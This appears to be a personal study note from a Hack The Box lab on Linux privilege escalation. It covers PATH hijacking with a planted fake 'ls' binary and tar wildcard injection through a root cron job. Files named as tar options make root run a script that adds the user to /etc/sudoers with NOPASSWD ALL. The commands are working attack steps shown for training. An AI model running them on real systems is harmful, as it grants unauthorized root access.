---
id: Environment
aliases: []
tags:
  - Linux/Privesc/Environment
links: "[[Linux]]"
---

<!-- PATH {{{-->
# PATH

The `$PATH` [environment variable](https://en.wikipedia.org/wiki/Environment_variable)
specifies the set of directories where an executable can be located

<!-- Tip {{{-->
> [!tip]
>
> Any directory inside the `PATH` variable with
> [[Linux/General/File System/Permissions|write permissions]]
> may allow to hijack its libraries or binaries
<!-- }}} -->

```sh
echo $PATH
```

```sh
env | grep PATH
```

<!-- Writeable PATH {{{-->
## Writeable PATH

Automated script

```sh
echo $PATH \
  | tr ':' '\n' \
  | while read dir; \
        do [ -d "$dir" ] && [ -w "$dir" ] && echo "[+] :: Write Permission Set :: $dir"; \
    done
```

___
<!-- }}} -->

<!-- Path Abuse {{{-->
## Path Abuse

1. Add the current directory (`.`) to the PATH

```sh
PATH=.:$PATH
```

```sh
export PATH
```

2. Create a malicious executable in the current directory
   and execute it

<!-- Example {{{-->
> [!example]-
>
> 1. Add the current directory to the PATH
>
> ```sh
> htb_student@NIX02:~$ PATH=.:${PATH}
> ```
>
> ```sh
> htb_student@NIX02:~$ export PATH
> ```
>
> ```sh
> htb_student@NIX02:~$ echo $PATH
> ```
>
> ```sh
> .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
> ```
>
> 2. Create a malicious script
>
> ```sh
> htb_student@NIX02:~$ touch ls
> ```
>
> ```sh
> htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
> ```
>
> ```sh
> htb_student@NIX02:~$ chmod +x ls
> ```
>
> 3. Execute the malicious script
>
> ```sh
> htb_student@NIX02:~$ ls
> ```
>
> ```sh
> PATH ABUSE!!
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Wildcard Abuse {{{-->
# Wildcard Abuse

The [tar](https://linux.die.net/man/1/tar) command allows
to execute a shell command when `checkpoint` is set

<!-- Example {{{-->
> [!example]-
>
> ```sh
> man tar
> ```
>
> ```sh
> <SNIP>
> Informative output
>        --checkpoint[=N]
>               Display progress messages every Nth record (default 10).
>
>        --checkpoint-action=ACTION
>               Run ACTION on each checkpoint.
> ```
<!-- }}} -->

A [[Cron Jobs#Cron Jobs|Cron Job]] is set to back up
the `home/htb-student` directory and create a compressed archive
every minute.

<!-- Example {{{-->
> [!example]-
>
> ```sh
> #
> #
> mh dom mon dow command
> */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
> ```
<!-- }}} -->

Write out the command names as filenames


<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb-student@NIX02:~$ ls -la
> ```
>
> ```sh
> total 56
> drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
> drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
> -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
> -rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
> ```
<!-- }}} -->

1. `root.sh`: Add the user to sudoers

```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

2. `--checkpoint=1`: Set tar checkpoint to `1`

```sh
echo "" > --checkpoint=1
```

3. `--checkpoint-action=exec=sh root.sh`:
   Execute `root.sh` on tar checkpoint

```sh
echo "" > "--checkpoint-action=exec=sh root.sh"
```

The [[Cron Jobs#Cron Jobs|Cron Job's]] wildcard be interpreted
and expanded by the shell to execute `root.sh`

```sh
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz
--checkpoint=1 --checkpoint-action=exec=sh root.sh
```

`root.sh` adds the user to `/etc/sudoers`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo -l
> ```
> ```sh
> Matching Defaults entries for htb-student on NIX02:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User htb-student may run the following commands on NIX02:
>     (root) NOPASSWD: ALL
> ```
<!-- }}} -->

___
<!-- }}} -->
